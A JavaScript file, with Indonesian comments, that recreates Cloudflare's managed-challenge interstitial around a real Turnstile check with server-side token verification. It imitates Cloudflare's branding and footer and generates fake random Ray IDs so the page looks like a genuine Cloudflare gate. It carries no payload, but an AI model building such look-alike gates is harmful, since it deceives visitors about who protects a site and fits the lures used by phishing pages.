/**
 * Cloudflare Managed Challenge — replikasi alur & tampilan.
 *
 * KUNCI TAMPILAN (seperti ko-fi.com):
 *   Widget dirender dengan appearance: 'interaction-only' — persis mode yang
 *   dipakai interstitial Cloudflare asli. Selama verifikasi berjalan, widget
 *   TIDAK terlihat; yang tampak hanya spinner berputar. Widget baru muncul
 *   kalau Cloudflare memang meminta interaksi (kasus langka).
 *
 * Dua mode:
 *   1. Statis  — HTML gate sudah ada di halaman (#cf-gate). Dipakai index.html.
 *   2. Dinamis — script membangun overlay gate sendiri. Dipakai halaman lain.
 *
 * Alur persis interstitial Cloudflare (locale id, tema gelap):
 *   "Melakukan verifikasi keamanan" (spinner berputar)
 *   → "Verifikasi berhasil. Menunggu response dari <host>." (titik berjalan)
 *   → konten halaman / redirect.
 *
 * Verifikasi token dilakukan SERVER-SIDE lewat /api/verify-turnstile;
 * callback klien saja tidak cukup — hasil server yang menentukan.
 *
 * Clearance disimpan per HOST (seperti cookie cf_clearance Cloudflare):
 * sekali lolos, halaman lain di host yang sama tidak ditanya lagi selama
 * 30 menit.
 */
(function () {
  'use strict';

  var HOST = location.hostname;
  var SESSION_KEY = 'cf_clearance_' + HOST;
  var SESSION_MS = 30 * 60 * 1000; // 30 menit, seperti clearance Cloudflare

  function cfg() { return window.CF_GATE_CONFIG || {}; }

  function rayId() {
    var chars = '0123456789abcdef', out = '';
    for (var i = 0; i < 16; i++) out += chars[Math.floor(Math.random() * 16)];
    return out;
  }

  function passed() {
    try {
      var raw = sessionStorage.getItem(SESSION_KEY);
      if (!raw) return false;
      return (Date.now() - Number(raw)) < SESSION_MS;
    } catch (e) { return false; }
  }

  function markPassed() {
    try { sessionStorage.setItem(SESSION_KEY, String(Date.now())); } catch (e) {}
  }

  /** Gate aktif: sembunyikan konten halaman (hanya overlay gate yang tampak). */
  function showGate() {
    document.documentElement.classList.remove('cf-gating');
    if (document.body) document.body.classList.add('cf-gated');
  }

  /** Halaman tampil: buang semua kelas gate. */
  function revealPage() {
    document.documentElement.classList.remove('cf-gating');
    if (document.body) document.body.classList.remove('cf-gated');
  }

  /** Isi placeholder di dalam gate: nama host + Ray ID. */
  function fillStatics(root) {
    var hosts = root.querySelectorAll('[data-cf-host]');
    for (var i = 0; i < hosts.length; i++) hosts[i].textContent = HOST;
    var rays = root.querySelectorAll('[data-cf-ray]');
    for (var j = 0; j < rays.length; j++) rays[j].textContent = rayId();
  }

  /* ── Verifikasi server-side ───────────────────────────────────────────── */

  /** Alamat endpoint dari berkas tunnel (diperbarui otomatis oleh VPS). */
  function endpointFromFile() {
    return fetch('/backend-url.json', { cache: 'no-store' })
      .then(function (r) { return r.ok ? r.json() : null; })
      .then(function (d) {
        return (d && d.api_base) ? d.api_base.replace(/\/$/, '') + '/api/verify-turnstile' : null;
      })
      .catch(function () { return null; });
  }

  function postVerify(url, token) {
    return fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: token })
    }).then(function (res) { return res.json().catch(function () { return {}; }); });
  }

  function verifyToken(token, onOk, onRetry) {
    var primary = cfg().verifyEndpoint;
    var attempt = primary
      ? postVerify(primary, token).catch(function () {
          // Endpoint utama tidak terjangkau — coba alamat dari berkas tunnel.
          return endpointFromFile().then(function (url) {
            if (!url || url === primary) throw new Error('no fallback');
            return postVerify(url, token);
          });
        })
      : endpointFromFile().then(function (url) {
          if (!url) throw new Error('no endpoint');
          return postVerify(url, token);
        });

    attempt
      .then(function (data) {
        if (data && data.success) onOk();
        else onRetry();
      })
      .catch(function () { onRetry(); });
  }

  /* ── Opsi render widget — sama untuk kedua mode ───────────────────────── */

  /**
   * Widget tersembunyi selama verifikasi (interaction-only), persis
   * Cloudflare. Baru muncul kalau Cloudflare meminta interaksi.
   */
  function widgetOptions(onToken, onRetry) {
    return {
      sitekey: cfg().siteKey,
      theme: 'dark',
      appearance: 'interaction-only',
      callback: onToken,
      'error-callback': onRetry,
      'expired-callback': onRetry,
      'timeout-callback': onRetry
    };
  }

  /* ── Mode statis: gate sudah ada di HTML (index.html) ─────────────────── */

  function staticGate(root) {
    var checking = root.querySelector('#cf-checking');
    var success = root.querySelector('#cf-success');
    var slot = root.querySelector('#cf-widget');

    function showSuccess() {
      if (checking) checking.classList.add('cf-hidden');
      if (slot) slot.classList.add('cf-hidden');
      if (success) success.classList.remove('cf-hidden');
    }

    function go() {
      markPassed();
      showSuccess();
      var target = cfg().redirect;
      if (target) {
        setTimeout(function () { location.replace(target); }, 1200);
      } else {
        setTimeout(function () { location.reload(); }, 1200);
      }
    }

    function renderWidget() {
      if (!slot) return;
      if (!window.turnstile || !window.turnstile.render) return;
      slot.innerHTML = '';
      window.turnstile.render(slot, widgetOptions(
        function (token) { verifyToken(token, go, renderWidget); },
        renderWidget
      ));
    }

    return { render: renderWidget };
  }

  /* ── Mode dinamis: bangun overlay sendiri (halaman lain) ──────────────── */

  function dynamicGate() {
    var root = document.createElement('div');
    root.id = 'cf-gate';
    root.innerHTML = [
      '<div class="main-wrapper" role="main">',
      '  <div class="main-content">',
      '    <div class="cf-brand">',
      '      <img src="/favicon.svg" alt="" onerror="this.style.display=\'none\'">',
      '      <h1 data-cf-host></h1>',
      '    </div>',
      '    <h2 class="cf-sub">Melakukan verifikasi keamanan</h2>',
      '    <p class="cf-lead">Situs web menggunakan layanan keamanan untuk melindungi dari bot jahat. Halaman ini ditunjukkan semasa kami memverifikasi bahwa Anda bukan bot.</p>',
      '    <div class="cf-status" id="cf-checking">',
      '      <div class="cf-ring" aria-hidden="true"><div></div><div></div><div></div><div></div></div>',
      '    </div>',
      '    <div class="cf-status cf-hidden" id="cf-success">',
      '      <h2 class="cf-status-title">Verifikasi berhasil. Menunggu response dari <span data-cf-host></span><span class="cf-dots"></span></h2>',
      '    </div>',
      '    <div id="cf-widget"></div>',
      '  </div>',
      '</div>',
      '<div class="footer" role="contentinfo">',
      '  <div class="footer-inner">',
      '    <div class="footer-wrapper">',
      '      <div class="ray-id">Ray ID: <code data-cf-ray></code></div>',
      '      <div class="footer-link-wrapper">',
      '        <span class="footer-text">Performa dan Keamanan dari <a rel="noopener noreferrer" href="https://www.cloudflare.com" target="_blank">Cloudflare</a></span>',
      '        <span class="footer-divider"></span>',
      '        <a target="_blank" rel="noopener noreferrer" href="https://www.cloudflare.com/privacypolicy/" class="footer-text">Privasi</a>',
      '      </div>',
      '    </div>',
      '  </div>',
      '</div>'
    ].join('\n');

    document.body.appendChild(root);
    fillStatics(root);

    var checking = root.querySelector('#cf-checking');
    var success = root.querySelector('#cf-success');
    var slot = root.querySelector('#cf-widget');

    function showSuccess() {
      if (checking) checking.classList.add('cf-hidden');
      if (slot) slot.classList.add('cf-hidden');
      if (success) success.classList.remove('cf-hidden');
    }

    function go() {
      markPassed();
      showSuccess();
      setTimeout(function () {
        revealPage();
        root.remove();
      }, 900);
    }

    function renderWidget() {
      if (!window.turnstile || !window.turnstile.render) return;
      slot.innerHTML = '';
      window.turnstile.render(slot, widgetOptions(
        function (token) { verifyToken(token, go, renderWidget); },
        renderWidget
      ));
    }

    return { render: renderWidget };
  }

  /* ── Mulai ────────────────────────────────────────────────────────────── */

  /** Petunjuk muat ulang kalau library Turnstile tidak kunjung termuat. */
  function showLoadHint(root) {
    var box = root.querySelector('#cf-checking');
    if (!box || box.querySelector('.cf-load-hint')) return;
    var p = document.createElement('p');
    p.className = 'cf-load-hint';
    p.style.marginTop = '1rem';
    p.innerHTML = 'Verifikasi tidak dapat dimuat. <a href="">Muat ulang halaman</a>.';
    box.appendChild(p);
  }

  function waitTurnstile(cb, onTimeout) {
    var tries = 0;
    var timer = setInterval(function () {
      tries += 1;
      if (window.turnstile && window.turnstile.render) {
        clearInterval(timer);
        cb();
      } else if (tries > 120) { // ~12 detik menunggu library
        clearInterval(timer);
        if (onTimeout) onTimeout();
      }
    }, 100);
  }

  function init() {
    var root = document.getElementById('cf-gate');
    var isStatic = Boolean(root);

    if (passed()) {
      // Sudah lolos verifikasi < 30 menit lalu — lanjut tanpa gate.
      if (isStatic && cfg().redirect) {
        location.replace(cfg().redirect);
        return;
      }
      revealPage();
      return;
    }

    if (isStatic) {
      fillStatics(root);
      var gate = staticGate(root);
      waitTurnstile(gate.render, function () { showLoadHint(root); });
    } else {
      var dyn = dynamicGate();
      showGate();
      waitTurnstile(dyn.render, function () { showLoadHint(document); });
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
